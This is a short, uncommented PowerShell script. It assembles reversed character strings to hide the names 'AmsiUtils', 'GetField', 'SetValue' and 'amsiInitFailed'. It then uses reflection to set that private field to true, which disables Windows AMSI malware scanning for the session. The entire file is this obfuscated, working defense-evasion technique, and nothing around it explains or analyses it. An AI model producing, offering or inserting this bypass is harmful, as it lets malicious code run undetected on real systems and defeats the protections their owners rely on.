$a = ('m','e','t','s','y','S') -join ''
$b = ('t','n','e','m','e','g', 'a','n','a','M') -join ''
$c = ('n','o','i','t','a','m','o','t','u','A') -join ''
$d = ('i','s','m','A') -join ''
$e = ('s','l','i','t','U') -join ''

$f = ([regex]::Matches($a,'.','RightToLeft') | ForEach {$_.value}) -join ''
$g = ([regex]::Matches($b,'.','RightToLeft') | ForEach {$_.value}) -join ''
$h = ([regex]::Matches($c,'.','RightToLeft') | ForEach {$_.value}) -join ''
$i = ([regex]::Matches($d,'.','RightToLeft') | ForEach {$_.value}) -join ''
$j = ([regex]::Matches($e,'.','RightToLeft') | ForEach {$_.value}) -join ''

$k = $f + '.' + $g + '.' + $h + '.' + $i + $j

$l = ('t', 'e', 'G') -join ''
$m = ('d', 'l', 'e', 'i', 'F') -join ''
$n = ([regex]::Matches($l,'.','RightToLeft') | ForEach {$_.value}) -join ''
$o = ([regex]::Matches($m,'.','RightToLeft') | ForEach {$_.value}) -join ''

$p = $n + $o

$q = ('t', 'e', 'S') -join ''
$r = ('e', 'u', 'l', 'a', 'V') -join ''
$s = ([regex]::Matches($q,'.','RightToLeft') | ForEach {$_.value}) -join ''
$t = ([regex]::Matches($r,'.','RightToLeft') | ForEach {$_.value}) -join ''

$u = $s + $t

$v = ('i','s','m','a') -join ''
$w = ('t','i','n','I') -join ''
$x = ('d','e','l','i','a','F') -join ''
$y = ([regex]::Matches($v,'.','RightToLeft') | ForEach {$_.value}) -join ''
$z = ([regex]::Matches($w,'.','RightToLeft') | ForEach {$_.value}) -join ''
$aa = ([regex]::Matches($x,'.','RightToLeft') | ForEach {$_.value}) -join ''

$ab = $y + $z + $aa

$nop = "N" + "o" + "n" + "P" + "u" + "b" + "l" + "i" + "c"
$sta = "S" + "t" + "a" + "t" + "i" + "c"

$type = [Ref].Assembly.GetType($k)
$field = $type."$p"($ab, "$nop,$sta")
$field."$u"($null, $true)
